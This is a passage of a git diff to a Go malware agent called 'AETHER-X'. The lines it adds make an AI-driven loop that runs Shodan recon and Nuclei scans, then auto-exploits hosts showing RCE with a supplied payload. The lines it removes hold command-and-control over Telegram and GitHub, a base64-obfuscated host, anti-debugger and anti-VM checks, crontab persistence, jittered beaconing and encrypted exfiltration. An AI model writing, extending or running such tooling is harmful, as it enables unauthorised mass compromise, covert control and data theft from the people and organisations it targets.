+					"industry": cmd["industry"],
+				}
+				decision := AI.Decide("RECON", context)
+				if decision["directive"] == "QUERY" {
+					hosts := shodanQuery(decision["target"])
+					for _, h := range hosts {
+						h.Vulns = runNuclei(h.IP)
+						h.Score = AI.ScoreHost(h)
+						if h.Score > 8.0 && contains(h.Vulns, "RCE") {
+							if exploitRCE(h, cmd["payload"]) {
+								h.Exploited = true
+								reportExploit(h)
+							}
+						}
+					}
+				}
+			}
+		}
+	})
+
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	<-sigChan
+	SupervisorNode.cancel()
+	SupervisorNode.wg.Wait()
 }
 
 // 🔄 SUPERVISOR
@@ -323,7 +905,7 @@ func (s *Supervisor) SpawnWorker(name string, work func(ctx context.Context) err
 			err := func() (err error) {
 				defer func() {
 					if r := recover(); r != nil {
-						err = fmt.Errorf("panic recovered in %s: %v", name, r)
+						err = fmt.Errorf("panic in %s: %v", name, r)
 					}
 				}()
 				return work(s.ctx)
@@ -333,11 +915,11 @@ func (s *Supervisor) SpawnWorker(name string, work func(ctx context.Context) err
 				continue
 			}
 			restarts++
-			if restarts > MaxWorkerRestarts {
+			if restarts > 5 {
 				s.updateStatus("DEGRADED")
 				return
 			}
-			time.Sleep(calculateBackoff(restarts))
+			time.Sleep(2 * time.Second * time.Duration(1<<uint(restarts)))
 		}
 	}()
 }
@@ -346,319 +928,4 @@ func (s *Supervisor) updateStatus(st string) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	s.status = st
-}
-
-func calculateBackoff(attempt int) time.Duration {
-	backoff := BaseBackoff * time.Duration(1<<uint(attempt))
-	if backoff > MaxBackoff {
-		backoff = MaxBackoff
-	}
-	n, _ := rand.Int(rand.Reader, big.NewInt(1000))
-	return backoff + time.Duration(n.Int64())*time.Millisecond
-}
-
-// 🌐 HTTP CLIENT
-func initHttpClient() {
-	clientOnce.Do(func() {
-		HttpClient = &http.Client{
-			Timeout: 15 * time.Second,
-			Transport: &http.Transport{
-				MaxIdleConns:        100,
-				MaxIdleConnsPerHost: 50,
-				IdleConnTimeout:     45 * time.Second,
-				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
-				ForceAttemptHTTP2:   true,
-			},
-		}
-	})
-}
-
-// 🔑 CRYPTO
-func deriveKey(salt []byte) []byte {
-	secret := os.Getenv("AGENT_SECRET")
-	if secret == "" {
-		secret = "fallback_secret_only_for_test"
-	}
-	return pbkdf2(secret, salt, 10000, 32, sha256.New)
-}
-
-func encryptData(plaintext []byte) (string, error) {
-	salt := make([]byte, 16)
-	_, _ = rand.Read(salt)
-	key := deriveKey(salt)
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return "", err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return "", err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	_, _ = rand.Read(nonce)
-	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-	encrypted := append(salt, ciphertext...)
-	return base64.RawURLEncoding.EncodeToString(encrypted), nil
-}
-
-func signMessage(data []byte) []byte {
-	key, _ := base64.StdEncoding.DecodeString(C2HMACKey)
-	if len(key) == 0 {
-		key = []byte("default_hmac_key_buffer_bytes")
-	}
-	mac := hmac.New(sha256.New, key)
-	mac.Write(data)
-	sum := mac.Sum(nil)
-	if len(sum) > HMAC_TRUNC {
-		return sum[:HMAC_TRUNC]
-	}
-	return sum
-}
-
-// 📡 C2 SAFE HELPERS WITH SAFE JSON TYPE ASSERTIONS
-func telegramSend(msg string) {
-	if TelegramToken == "" {
-		TelegramToken = os.Getenv("TELEGRAM_TOKEN")
-	}
-	if TelegramChat == "" {
-		TelegramChat = os.Getenv("TELEGRAM_CHAT")
-	}
-	if TelegramToken == "" || TelegramChat == "" {
-		return
-	}
-	hostBytes, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
-	targetURL := fmt.Sprintf("https://%s/bot%s/sendMessage", string(hostBytes), TelegramToken)
-	
-	formData := url.Values{}
-	formData.Set("chat_id", TelegramChat)
-	formData.Set("text", msg)
-	formData.Set("parse_mode", "Markdown")
-
-	_, _ = httpPost(targetURL, []byte(formData.Encode()), map[string]string{
-		"Content-Type": "application/x-www-form-urlencoded",
-	})
-}
-
-func fetchCommand() string {
-	repo := base64Decode(GitHubC2Repo)
-	endpoint := fmt.Sprintf("%s/contents/cmd.json", repo)
-	data, err := httpGet(endpoint, map[string]string{
-		"Authorization": "Bearer " + GitHubToken,
-	})
-	if err != nil {
-		return ""
-	}
-	var result map[string]interface{}
-	if err := json.Unmarshal(data, &result); err != nil {
-		return ""
-	}
-	contentVal, ok := result["content"]
-	if !ok || contentVal == nil {
-		return ""
-	}
-	contentStr, ok := contentVal.(string)
-	if !ok {
-		return ""
-	}
-	decoded, err := base64.StdEncoding.DecodeString(strings.ReplaceAll(contentStr, "\n", ""))
-	if err != nil {
-		return ""
-	}
-	return string(decoded)
-}
-
-func httpGet(target string, headers map[string]string) ([]byte, error) {
-	time.Sleep(jitter())
-	req, err := http.NewRequest(http.MethodGet, target, nil)
-	if err != nil {
-		return nil, err
-	}
-	for k, v := range headers {
-		req.Header.Set(k, v)
-	}
-	resp, err := HttpClient.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-	return io.ReadAll(resp.Body)
-}
-
-func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
-	time.Sleep(jitter())
-	req, err := http.NewRequest(http.MethodPost, target, bytes.NewBuffer(data))
-	if err != nil {
-		return nil, err
-	}
-	for k, v := range headers {
-		req.Header.Set(k, v)
-	}
-	resp, err := HttpClient.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-	return io.ReadAll(resp.Body)
-}
-
-// 🧪 HELPERS
-func isDebuggerAttached() bool {
-	err := syscall.PtraceAttach(os.Getpid())
-	if err == nil {
-		_ = syscall.PtraceDetach(os.Getpid())
-	}
-	return err == nil || err == syscall.EPERM
-}
-
-func isVirtualMachine() bool {
-	if content, err := os.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
-		s := strings.ToLower(string(content))
-		return strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu") || strings.Contains(s, "kvm")
-	}
-	return false
-}
-
-func generateHostID() string {
-	mac := getMACAddress()
-	seed := mac + runtime.GOOS + runtime.GOARCH + os.Getenv("CODESPACE_NAME")
-	sum := sha256.Sum256([]byte(seed))
-	return hex.EncodeToString(sum[:6])
-}
-
-func getMACAddress() string {
-	ifcs, err := net.Interfaces()
-	if err != nil {
-		return "00:00:00:00:00:00"
-	}
-	for _, ifc := range ifcs {
-		hw := ifc.HardwareAddr.String()
-		if len(hw) > 0 && !strings.HasPrefix(hw, "00:00:00") {
-			return hw
-		}
-	}
-	return "00:00:00:00:00:00"
-}
-
-func persistAgent() {
-	execPath, err := os.Executable()
-	if err != nil {
-		return
-	}
-	data, err := os.ReadFile(execPath)
-	if err != nil {
-		return
-	}
-	homeDir, err := os.UserHomeDir()
-	if err != nil {
-		return
-	}
-	dst := filepath.Join(homeDir, PersistCacheFile)
-	_ = os.MkdirAll(filepath.Dir(dst), 0700)
-	_ = os.WriteFile(dst, data, 0700)
-	
-	cronCmd := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '@reboot %s &') | crontab -", PersistCacheFile, dst)
-	_ = exec.Command("sh", "-c", cronCmd).Run()
-}
-
-func jitter() time.Duration {
-	n, _ := rand.Int(rand.Reader, big.NewInt(int64(JitterMax)))
-	return time.Duration(n.Int64())
-}
-
-func pbkdf2(password string, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
-	prf := hmac.New(h, []byte(password))
-	hashLen := prf.Size()
-	numBlocks := (keyLen + hashLen - 1) / hashLen
-	var buf [4]byte
-	dk := make([]byte, 0, numBlocks*hashLen)
-	U := make([]byte, hashLen)
-	for block := 1; block <= numBlocks; block++ {
-		prf.Reset()
-		_ = prf.Write(salt)
-		buf[0] = byte(block >> 24)
-		buf[1] = byte(block >> 16)
-		buf[2] = byte(block >> 8)
-		buf[3] = byte(block)
-		_, _ = prf.Write(buf[:4])
-		dk = prf.Sum(dk)
-		T := dk[len(dk)-hashLen:]
-		copy(U, T)
-		for i := 2; i <= iter; i++ {
-			prf.Reset()
-			_, _ = prf.Write(U)
-			U = prf.Sum(U[:0])
-			for x := range U {
-				T[x] ^= U[x]
-			}
-		}
-	}
-	return dk[:keyLen]
-}
-
-func base64Decode(s string) string {
-	decoded, err := base64.StdEncoding.DecodeString(s)
-	if err != nil {
-		return s
-	}
-	return string(decoded)
-}
-
-// 🚀 MAIN ENTRYPOINT
-func main() {
-	if isDebuggerAttached() || isVirtualMachine() {
-		time.Sleep(30 * time.Second)
-		return
-	}
-
-	persistAgent()
-	HostID = generateHostID()
-	initHttpClient()
-	
-	AI = NewPhi3CognitiveEngine()
-	SupervisorNode = NewSupervisor()
-
-	telegramSend(fmt.Sprintf("🟢 *AETHER-X v4.0 SECURE RUN* | Host: `%s` | Active.", HostID))
-
-	SupervisorNode.SpawnWorker("CognitiveSupervisor", func(ctx context.Context) error {
-		ticker := time.NewTicker(30 * time.Second)
-		defer ticker.Stop()
-		for {
-			select {
-			case <-ctx.Done():
-				return nil
-			case <-ticker.C:
-				var m runtime.MemStats
-				runtime.ReadMemStats(&m)
-				metrics := map[string]interface{}{
-					"host_id":        HostID,
-					"os":             runtime.GOOS,
-					"arch":           runtime.GOARCH,
-					"cpu_cores":      runtime.NumCPU(),
-					"alloc_mb":       m.Alloc / 1024 / 1024,
-					"num_goroutines": runtime.NumGoroutine(),
-					"uptime_sec":     time.Now().Unix(),
-				}
-				assessment, err := AI.EvaluateTelemetry(metrics)
-				if err != nil {
-					continue
-				}
-				switch assessment.Directive {
-				case "THROTTLE":
-					time.Sleep(15 * time.Second)
-				case "ISOLATE":
-					for len(TelemetryQueue) > 0 {
-						<-TelemetryQueue
-					}
-				case "RESTART":
-					return errors.New("restart requested by cognitive policy")
-				}
-			}
-		}
-	})
-
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	<-sigChan
-	SupervisorNode.cancel()
-	SupervisorNode.wg.Wait()
 }
